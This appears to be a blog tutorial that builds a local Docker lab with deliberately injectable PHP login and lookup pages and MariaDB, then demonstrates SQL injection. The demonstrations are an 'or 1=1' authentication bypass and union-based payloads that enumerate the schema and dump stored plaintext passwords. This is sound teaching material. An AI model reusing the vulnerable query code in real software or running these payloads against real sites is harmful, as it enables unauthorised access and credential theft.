---
title: SQL Injection
date: 2023-05-31
categories: [Notes, SQLi]
tags: [SQLi, Docker, PHP, mariadb]
---

![](/assets/img/SQLi/19.png)

Hey! Whatsup? Today we're going to be learning some `SQLi` on `mariadb`! 

## Setting up the lab

- - -

### Setting up Docker

- - -

To perform this, we're using docker:

```zsh
❯ docker pull ubuntu
Using default tag: latest
latest: Pulling from library/ubuntu
Digest: sha256:432f545c6ba13b79e2681f4cc4858788b0ab099fc1cca799cc0fae4687c69070
Status: Image is up to date for ubuntu:latest
docker.io/library/ubuntu:latest
                                                                                                                                                                                                                              
❯ docker run -it --name SQLi ubuntu
root@90296a09aa4e:/# 
```

### Installing services

- - -

Ok, now we need to install the tools for the lab:

```bash
root@90296a09aa4e:/# apt-get update
Hit:1 http://archive.ubuntu.com/ubuntu jammy InRelease
Get:2 http://security.ubuntu.com/ubuntu jammy-security InRelease [110 kB]
Get:3 http://archive.ubuntu.com/ubuntu jammy-updates InRelease [119 kB]
Get:4 http://archive.ubuntu.com/ubuntu jammy-backports InRelease [108 kB]
Get:5 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 Packages [841 kB]
Get:6 http://archive.ubuntu.com/ubuntu jammy-updates/universe amd64 Packages [1160 kB]
Fetched 2337 kB in 3s (912 kB/s)   
Reading package lists... Done
root@90296a09aa4e:/# apt install apache2 mariadb-server php php-mysql
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
php is already the newest version (2:8.1+92ubuntu1).
php-mysql is already the newest version (2:8.1+92ubuntu1).
apache2 is already the newest version (2.4.52-1ubuntu4.5).
mariadb-server is already the newest version (1:10.6.12-0ubuntu0.22.04.1).
0 upgraded, 0 newly installed, 0 to remove and 11 not upgraded.
root@90296a09aa4e:/# 
```

Perfect! 
After those programs are installed, we need to start `apache` server and `madiadb`:

```bash
root@90296a09aa4e:/# service apache2 start
*Starting Apache httpd webserver apache2                                                                                      

root@90296a09aa4e:/# service mariadb start
 * Starting MariaDB database server mariadbd   [ OK ] 
root@90296a09aa4e:/# 
```

### Creating database

- - -

Now we have to create a database and the tables with the columns:

```bash
root@90296a09aa4e:/# mariadb
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 33
Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> create database ruycr4ft
    -> ;
Query OK, 1 row affected (0.001 sec)

MariaDB [(none)]> use ruycr4ft;
Database changed
MariaDB [ruycr4ft]> CREATE TABLE users (id int, role varchar(255), username varchar(255), password varchar(255));
Query OK, 0 rows affected (0.012 sec)

MariaDB [ruycr4ft]> 
```

Perfect! Now let's insert the info for each user:

```bash
MariaDB [ruycr4ft]> INSERT INTO users (id, role, username, password) VALUES (1, "Marketing Manager", "sromero", "Mypassword123#");
Query OK, 1 row affected (0.003 sec)

MariaDB [ruycr4ft]> INSERT INTO users (id, role, username, password) VALUES (2, "Boss", "ccrespo", "Tst1ngP@$$w0rd!");
Query OK, 1 row affected (0.006 sec)

MariaDB [ruycr4ft]> INSERT INTO users (id, role, username, password) VALUES (3, "IT Manager", "dsimion", "darius15");
Query OK, 1 row affected (0.006 sec)

MariaDB [ruycr4ft]> INSERT INTO users (id, role, username, password) VALUES (4, "Report Writer", "lnieto", "Th1s1smyp@$$w0rd");
Query OK, 1 row affected (0.007 sec)

MariaDB [ruycr4ft]> 
```

All right! Let's check if everything went ok:

```bash
MariaDB [ruycr4ft]> select * from users;
+------+-------------------+----------+------------------+
| id   | role              | username | password         |
+------+-------------------+----------+------------------+
|    1 | Boss              | ccrespo  | Tst1ngP@$$w0rd!  |
|    2 | IT Manager        | dsimion  | darius15         |
|    3 | Report Writer     | lnieto   | Th1s1smyp@$$w0rd |
|    4 | Marketing Manager | sromero  | Mypassword123#   |
+------+-------------------+----------+------------------+
4 rows in set (0.001 sec)

MariaDB [ruycr4ft]> 
```

Nice! 
Now we need to create a user and give it access to the `ruycr4ft` database:

```bash
MariaDB [ruycr4ft]> CREATE USER 'user'@localhost IDENTIFIED BY 'password';
Query OK, 0 rows affected (0.004 sec)

MariaDB [ruycr4ft]> GRANT ALL ON ruycr4ft.* TO 'user'@localhost IDENTIFIED BY 'password';
Query OK, 0 rows affected (0.003 sec)

MariaDB [ruycr4ft]> 
```

### Creating vulnerable scripts for the website

- - -

We are going to create the vulnerable scripts for the web. After they are created, we are going to save them in `/var/www/html`:

- index.html

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Welcome to ruycr4ft!</title>
  <style>
    body {
      background-image: url('background.jpg');
      background-size: cover;
      background-position: center;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 50px;
    }
    
    h1 {
      color: #ffffff;
      font-size: 36px;
    }
    
    p {
      color: #ffffff;
      font-size: 24px;
      margin-top: 20px;
    }
    
    .btn {
      display: inline-block;
      background-color: #4CAF50;
      color: #ffffff;
      padding: 10px 20px;
      text-decoration: none;
      font-size: 18px;
      border-radius: 4px;
      margin-top: 30px;
    }
  </style>
</head>
<body>
  <h1>Welcome to ruycr4ft!</h1>
  <p>We are a corporation that focuses on web development!</p>
  <a class="btn" href="login.php">Login</a>
</body>
</html>
```

- login.php

```php
<!DOCTYPE html>
<html>
<head>
  <title>Login Panel</title>
  <style>
    body {
      background-image: url('background.jpg');
      background-size: cover;
      background-position: center;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 50px;
    }
    
    .container {
      max-width: 400px;
      margin: 50px auto;
      background-color: #fff;
      padding: 20px;
      border-radius: 5px;
      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    }
    
    h1 {
      text-align: center;
      margin-bottom: 20px;
    }
    
    label {
      display: block;
      margin-bottom: 10px;
      font-weight: bold;
    }
    
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      border-radius: 3px;
      border: 1px solid #ccc;
    }
    
    input[type="submit"] {
      width: 100%;
      padding: 10px;
      background-color: #4CAF50;
      color: #fff;
      border: none;
      cursor: pointer;
      border-radius: 3px;
    }
    
    input[type="submit"]:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Login Panel</h1>
    <form action="panel.php" method="post">
      <label for="username">Username:</label>
      <input type="text" id="username" name="username">
      <br>
      <label for="password">Password:</label>
      <input type="password" id="password" name="password">
      <br><br>
      <input type="submit" value="Login">
    </form>
  </div>
</body>
</html>
```

- panel.php

```php
<?php
$dbhostname = 'localhost';
$dbuser = 'user';
$dbpassword = 'password';
$dbname = 'ruycr4ft';

$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);

$username = $_POST["username"];
$password = $_POST["password"];

$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($connection, $query);

if (mysqli_num_rows($result) > 0) {
    session_start();
    $_SESSION["loggedin"] = true;
    header("Location: ruycr4ft.php");
} else {
    echo '<!DOCTYPE html>
        <html>
        <head>
          <title>Login Panel</title>
          <style>
            body {
              background-image: url("background.jpg");
              background-size: cover;
              background-position: center;
              font-family: Arial, sans-serif;
              text-align: center;
              padding: 50px;
            }
            
            .container {
              max-width: 400px;
              margin: 50px auto;
              background-color: #fff;
              padding: 20px;
              border-radius: 5px;
              box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            }
            
            h1 {
              text-align: center;
              margin-bottom: 20px;
            }
            
            label {
              display: block;
              margin-bottom: 10px;
              font-weight: bold;
            }
            
            input[type="text"],
            input[type="password"] {
              width: 100%;
              padding: 10px;
              border-radius: 3px;
              border: 1px solid #ccc;
            }
            
            input[type="submit"] {
              width: 100%;
              padding: 10px;
              background-color: #4CAF50;
              color: #fff;
              border: none;
              cursor: pointer;
              border-radius: 3px;
            }
            
            input[type="submit"]:hover {
              background-color: #45a049;
            }
            
            .error-message {
              color: red;
              text-align: center;
              margin-top: 10px;
            }
          </style>
        </head>
        <body>
          <div class="container">
            <h1>Login Panel</h1>
            <form action="panel.php" method="post">
              <label for="username">Username:</label>
              <input type="text" id="username" name="username">
              <br>
              <label for="password">Password:</label>
              <input type="password" id="password" name="password">
              <br><br>
              <input type="submit" value="Login">
              <div class="error-message">The Username or Password is Incorrect</div>
            </form>
          </div>
        </body>
        </html>';
}
?>
```

- ruycr4ft.php

```php
<!DOCTYPE html>
<html>
<head>
  <title>Information users</title>
  <style>
    body {
      background-image: url('background.jpg');
      background-size: cover;
      background-position: center;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 50px;
    }
    
    label {
      color: #ffffff;
      font-size: 18px;
    }
    
    input[type="text"] {
      padding: 10px;
      border-radius: 4px;
      border: 1px solid #ffffff;
      margin-bottom: 10px;
      width: 200px; /* Ajusta el ancho según tus necesidades */
    }
    
    input[type="submit"] {
      background-color: #4CAF50;
      color: #ffffff;
      padding: 10px 20px;
      text-decoration: none;
      font-size: 18px;
      border-radius: 4px;
      margin-top: 20px;
      border: none;
      cursor: pointer;
    }
    
    table {
      margin: 20px auto;
      border-collapse: collapse;
    }
    
    th, td {
      padding: 10px;
      border: 1px solid #ffffff;
      color: #ffffff;
    }
    
    th {
      background-color: #4CAF50;
    }
    
    td {
      background-color: #4CAF50;
    }
  </style>
</head>
<body>
  <form action="ruycr4ft.php" method="get">
    <label for="id">User id:</label>
    <br>
    <input type="text" id="id" name="id">
    <br><br>
    <input type="submit" value="Send">
  </form>
</body>
</html>

<?php

$dbhostname = 'localhost';
$dbuser = 'user';
$dbpassword = 'password';
$dbname = 'ruycr4ft';

$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);

$input = $_GET['id'];

$query = "SELECT id, role, username FROM users WHERE id='$input'";

$results = mysqli_query($connection, $query);

echo "<table>";
echo "<tr>";
echo "<th align='center'>id</th>";
echo "<th align='center'>role</th>";
echo "<th align='center'>username</th>";
echo "</tr>";

while ($rows = mysqli_fetch_assoc($results)) {
    echo "<tr>";
    echo "<td align='center'> " . $rows['id'] . "</td>";
    echo "<td align='center'> " . $rows['role'] . "</td>";
    echo "<td align='center'> " . $rows['username'] . "</td>";
    echo "</tr>";
}

echo "</table>";

?>
```

Perfect! So now we only need to put these scripts into `/var/www/html`.

## PoC

- - -

### SQLi -> Authentication Bypass

- - -

We can access the web, and we are going to see a `Login` button:

![](/assets/img/SQLi/1.png)

Clicking on that, will redirect us to a `Login` panel:

![](/assets/img/SQLi/2.png)

If we loggin with any username and any password the page will respond with an authentication error:

![](/assets/img/SQLi/3.png)

This is because the query is comparing the username and password we've inputted with a username and password with the database:

```sql
SELECT * FROM users WHERE username='$username' AND password='$password'";
```

Now, in the code of the page (we can see it by hitting CTRL + U) we can see that there is not any regex so we are allowed to use **any** character on the username and password fields. That means that we could **comment** the password field by inputting `-- -`, which is `SQL` comment:

![](/assets/img/SQLi/5.png)

Here you need to input a **valid** username and in the password field you can put **whatever you want**. If we click `Login`, we'll notice that we've been logged in into the web!

![](/assets/img/SQLi/6.png)

Why is this happening? Well, in the above `SQL` request, a password was being required because it wasn't being commented, now, we've been executed this:

```sql
SELECT * FROM users WHERE username=''or 1=1-- -' AND password='pass'";
```

As you can see, the sentence after `-- -` is not being interpreted.

### SQLi -> Union Based

- - -

When we get logged in, we are able to input an ID and the web will return us a username with its role:

![](/assets/img/SQLi/7.png)

In the url, we can see that the ID we've entered:

![](/assets/img/SQLi/8.png)

Here we can try a database ordering and we can see that there is no info being printed, but because the table is not being shown, we can deduce that is working:

```sql
1'order by 4-- -
```

![](/assets/img/SQLi/9.png)

Let's try to order by 3 and see if there is any results:

```sql
1'order by 3-- -
```

![](/assets/img/SQLi/10.png)

Ok, we can see that with 3 its working, so that means that there are only 3 columns on this table.
Now we can start to messing around with `union select` to print 3 fields:

```sql
1'union select 1,2,3-- -
```

![](/assets/img/SQLi/11.png)

All right! We can see that `union select` SQL Injection works as expected, so we can now mess around **more**. Let's print the database name, for example in the 3rd column:

```sql
1'union select 1,database(),3-- -
```

![](/assets/img/SQLi/12.png)

Now we can modify the query so we can see the existing databases:

```sql
1'union select 1,schema_name,3 from information_schema.schemata-- -
```

![](/assets/img/SQLi/14.png)

Now we could also use `group_concat` to see them in one line separated by commas:

```sql
1'union select 1,group_concat(schema_name),3 from information_schema.schemata-- -
```

![](/assets/img/SQLi/15.png)

Great! Now we know the name of the databases, so let's enum the tables of `ruycr4ft`:

```sql
1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='ruycr4ft'-- -
```

![](/assets/img/SQLi/16.png)

All right! So here we can see the table `users`. Let's enumerate its columns!

```sql
1'union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='ruycr4ft' and table_name='users'-- -
```

![](/assets/img/SQLi/17.png)

Columns `username` and `password` seems interesting, so let's list its content:

```sql
1'union select 1,group_concat(username,0x3a,password),3 from ruycr4ft.users-- -
```

![](/assets/img/SQLi/18.png)

>**Note:** `0x3a` is equal to `:` in hexadecimal.

This is how we could enumerate the whole database without knowing credentials!

>**Important:** SQLi Time Based and Boolean Based will be posted soon!